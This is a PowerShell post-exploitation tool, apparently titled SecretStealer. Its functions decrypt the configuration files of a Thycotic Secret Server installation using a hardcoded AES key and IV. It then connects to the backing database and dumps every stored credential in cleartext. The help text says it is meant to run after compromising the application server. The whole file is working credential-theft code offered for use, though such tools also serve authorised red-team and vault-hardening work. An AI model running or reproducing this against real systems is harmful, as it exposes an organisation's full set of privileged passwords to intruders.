function Invoke-SecretDecrypt 
{
<#
.SYNOPSIS
Decrypts a secret retrieved from a Thycotic Secret Server database. 
Author: DoI (@0x446f49)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
.DESCRIPTION
Invoke-SecretDecrypt will decrypt a single Thycotic Secret Server entry. 
The various data (keys, ivs, encryption.config) need to be manually
specified. Please see the README.md for more information.
.PARAMETER EncryptionConfig
The path to the encryption.config file, normally found within the Secret
Server web root.
.PARAMETER Item
The encrypted item value from the tbSecretItem table.
.Parameter ItemIV
The item value's IV from the tbSecretItem table.
.Parameter Key
The key from the tbSecrets table.
.PARAMETER IvMEK
The IvMEK from the tbSecrets database table.
.EXAMPLE
Invoke-SecretDecrypt -EncryptionConfig C:\Users\user\encryption.config -Item 9993c5097491ba2b42a10b9a9b7a6ab7239b107337c348086eeb5f5b29c76f33 -IV CF4C2D4F7FA432D64D9712212A06EEA9 -Key 5C195A500A3BF87C29163A52AC4EA2CFF6C5B69407B6F91A7C7B100B6D20121AAFD052C11B13D542EA2F42137258C2EF -IvMEK 6080667306DA295A75E22667E9AD0376
#>

    Param (
        [Parameter( Position = 0, Mandatory = $True )]
        [String]
        $EncryptionConfig,

        [Parameter( Position = 1, Mandatory = $True )]
        [String]
        $Item,

        [Parameter( Position = 2, Mandatory = $True )]
        [String]
        $ItemIV,

        [Parameter( Position = 3, Mandatory = $True )]
        [String]
        $Key,

        [Parameter( Position = 4, Mandatory = $True )]
        [String]
        $IVMek
    )

    loadDeserializer

    $masterKeys = Get-MasterKeys($EncryptionConfig)
    $IVMekBytes = Convert-HexStringToByteArray($IVMek);
    $KeyBytes = Convert-HexStringToByteArray $Key
    $ItemIVBytes =  Convert-HexStringToByteArray $ItemIV
    $ItemBytes = Convert-HexStringToByteArray $Item

    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $cryptoTransform = $aes.CreateDecryptor($masterKeys.Get_Item("key256"), $IVMekBytes)
    $intermediateKey = $cryptoTransform.TransformFinalBlock($KeyBytes, 0, $KeyBytes.Length)
    
    $intKeyString = [System.BitConverter]::ToString($intermediateKey[0..32])
    Write-Verbose "Intermediate Key: $intKeyString"

    $cryptoTransform = $aes.CreateDecryptor($intermediateKey, $ItemIVBytes);
    $cleartext = [System.Text.Encoding]::Unicode.GetString($cryptoTransform.TransformFinalBlock($ItemBytes, 0, $ItemBytes.Length))
    
    Write-Host "Decrypted: $cleartext"
}

function Invoke-SecretStealer 
{
<#
.SYNOPSIS
Connects a Thycotic Secret Server database, extracts and decrypts all credentials.
Intended to be run after compromising the Thycotic Secret Server application server.
Author: DoI (@0x446f49)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
.DESCRIPTION
Invoke-SecretStealer will decrypt the various configuration files used by Secret
Server, connect to the database, extract all of the encrypted information and 
subsequetly decrypt and return the cleartext. 

This script is intended to be run directly on a Secret Server application server
after compromising the underlying host. 
.PARAMETER WebRoot
The path to the Secret Server web root. Normally C:\inetpub\wwwroot\SecretServer
or similar.

.EXAMPLE
Invoke-SecretStealer -WebRoot 'C:\inetpub\wwwroot\SecretServer\'
#>

    Param (
        [Parameter( Position = 0, Mandatory = $True )]
        [String]
        $WebRoot
    )

    if((Get-Item $WebRoot) -is [System.IO.DirectoryInfo]){
        $DatabaseConfig = Join-Path $WebRoot "database.config"
        $EncryptionConfig = Join-Path $WebRoot "encryption.config"
    }
    else{
        throw "$WebRoot is not a directory."
    }

    loadDeserializer
    $dbConnectionString = Get-DatabaseConnectionString($DatabaseConfig);
    $dataSet = Invoke-SQL -connectionString $dbConnectionString -sqlCommand "select s.SecretName, f.SecretFieldName, s.[Key], s.IvMEK, i.ItemValue, i.IV from tbSecretItem as i JOIN tbSecret as s ON (s.SecretID = i.SecretID) JOIN tbSecretField as f on (i.SecretFieldID = f.SecretFieldID)";

    $masterKeys = Get-MasterKeys($EncryptionConfig)
    
    # This is inefficient!
    $SecretName = $null;
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    foreach($row in $dataSet.Rows){
        if($SecretName -ne $row.SecretName){
            $cryptoTransform = $aes.CreateDecryptor($masterKeys.Get_Item("key256"), $row.IvMEK)
            $intermediateKey = $cryptoTransform.TransformFinalBlock($row.key, 0, $row.key.Length)
            $intKeyString = [System.BitConverter]::ToString($intermediateKey[0..32])
            Write-Verbose "Intermediate Key: $intKeyString"

            $SecretName = $row.SecretName;
        }

        $ItemBytes = Convert-HexStringToByteArray $row.ItemValue
        $cryptoTransform = $aes.CreateDecryptor($intermediateKey, $row.iv);
        $cleartext = [System.Text.Encoding]::Unicode.GetString($cryptoTransform.TransformFinalBlock($ItemBytes, 0, $ItemBytes.Length))
        Write-Host -Separator "," $row.SecretName $row.SecretFieldName $cleartext
    }
}

function Local:Get-MasterKeys{  
    Param (
        [Parameter( Position = 0, Mandatory = $True )]
        [String]
        $path
    )
  
    $master = [Thycotic.ihawu.Business.Config]::DecryptConfig($path)

    foreach($i in $master.Pairs){
        switch($i.key){
            "key" {
                $key = $i.Value
                Write-Verbose "Got master key: $key"
             }
            "key256" {
                $key256 = $i.Value
                Write-Verbose "Got master key256: $key256"
             }
            "iv" {
                $iv = $i.Value
                Write-Verbose "Got master IV: $iv"
            }
        }
    }
    if(!$key -or !$key256 -or !$iv){
        throw "Could not retrieve information from encryption.config"
    }

    return @{"key" = Convert-HexStringToByteArray($key); "key256" = Convert-HexStringToByteArray($key256); "iv" = Convert-HexStringToByteArray($iv)}
}

function Local:Get-DatabaseConnectionString{
    Param (
        [Parameter( Position = 0, Mandatory = $True )]
        [String]
        $path
    )
    
    $config = [Thycotic.ihawu.Business.Config]::DecryptConfig($path);

    foreach($i in $config.Pairs){
        if($i.key -eq "ConnectionString"){
            $con = $i.Value
            Write-Verbose "Connection string: $con";
            return $con;
        }
    }

    throw "Could not retrieve database connection string from database.config"
}

function Local:loadDeserializer{
    $Assem = ( 
        “System",
        "System.IO",
        "System.Reflection",
        "System.Runtime.Serialization"
    ) 
    
    # I know... I know...
    $Source = @” 
    using System; 
    using System.IO;
    using System.Reflection;
    using System.Runtime.Serialization;
    using System.Runtime.Serialization.Formatters.Binary;
    using System.Security.Cryptography;
    using System.Text;

    namespace Thycotic.ihawu.Business
    {
        [Serializable]
        public class EncryptedFile
        {
            public EncryptedPair[] Pairs = new EncryptedPair[0];
        }

        [Serializable]
        public class EncryptedPair
        {
            public string Key;
            public string Value;
        }

        public class Binder : SerializationBinder
        {
            public override Type BindToType(string assemblyName, string typeName)
            {
                // Define the new type to bind to
                Type typeToDeserialize = null;
                // Get the current assembly
                string currentAssembly = Assembly.GetExecutingAssembly().FullName;

                // Create the new type and return it
                typeToDeserialize = Type.GetType(string.Format("{0}, {1}", typeName, currentAssembly));
                return typeToDeserialize;
            }
        }

        public class Config
        {
            public static object DecryptConfig(string path)
            {
                string key = "020216980119760c0b79017097830b1d";
                string iv = "7a790a22020b6eb3630cdd080310d40a";

                AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
                aes.Key = StringToByteArray(key);
                aes.IV = StringToByteArray(iv);

                ICryptoTransform decryptor = aes.CreateDecryptor();

                var stream = new FileStream(path, FileMode.Open);
                CryptoStream cryptoStream = new CryptoStream((Stream)stream, decryptor, CryptoStreamMode.Read);

                var binFormat = new BinaryFormatter();
                binFormat.Binder = new Binder();
                binFormat.AssemblyFormat = System.Runtime.Serialization.Formatters.FormatterAssemblyStyle.Simple;

                object ret = binFormat.Deserialize(cryptoStream);
                cryptoStream.Close();
                stream.Close();
                return ret;
             }

             public static byte[] StringToByteArray(String hex)
             {
                int NumberChars = hex.Length;
                byte[] bytes = new byte[NumberChars / 2];
                for (int i = 0; i < NumberChars; i += 2)
                    bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
                return bytes;
             }
         }
    }
“@ 
    
    Add-Type -ReferencedAssemblies $Assem -TypeDefinition $Source -Language CSharp  
}

# Thanks SANS!
function Local:Convert-HexStringToByteArray{
[CmdletBinding()]
Param ( [Parameter(Mandatory = $True, ValueFromPipeline = $True)] [String] $String )
 
#Clean out whitespaces and any other non-hex crud.
$String = $String.ToLower() -replace '[^a-f0-9\\,x\-\:]',"
 
#Try to put into canonical colon-delimited format.
$String = $String -replace '0x|\x|\-|,',':'
 
#Remove beginning and ending colons, and other detritus.
$String = $String -replace '^:+|:+$|x|\',"
 
#Maybe there's nothing left over to convert...
if ($String.Length -eq 0) { ,@() ; return }
 
#Split string with or without colon delimiters.
if ($String.Length -eq 1)
{ ,@([System.Convert]::ToByte($String,16)) }
elseif (($String.Length % 2 -eq 0) -and ($String.IndexOf(":") -eq -1))
{ ,@($String -split '([a-f0-9]{2})' | foreach-object { if ($_) {[System.Convert]::ToByte($_,16)}}) }
elseif ($String.IndexOf(":") -ne -1)
{ ,@($String -split ':+' | foreach-object {[System.Convert]::ToByte($_,16)}) }
else
{ ,@() }
}

# Thanks Chris Magnuson!
function Local:Invoke-SQL {
    param(
        [string]$connectionString,
        [string]$sqlCommand = $(throw "Please specify a query."),
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    $connection = new-object system.data.SqlClient.SQLConnection($connectionString)
    $command = new-object system.data.sqlclient.sqlcommand($sqlCommand,$connection)
    $connection.Open()
    
    $adapter = New-Object System.Data.sqlclient.sqlDataAdapter $command
    $dataset = New-Object System.Data.DataSet
    $adapter.Fill($dataSet) | Out-Null
    
    $connection.Close()
    
    return $dataSet.Tables
}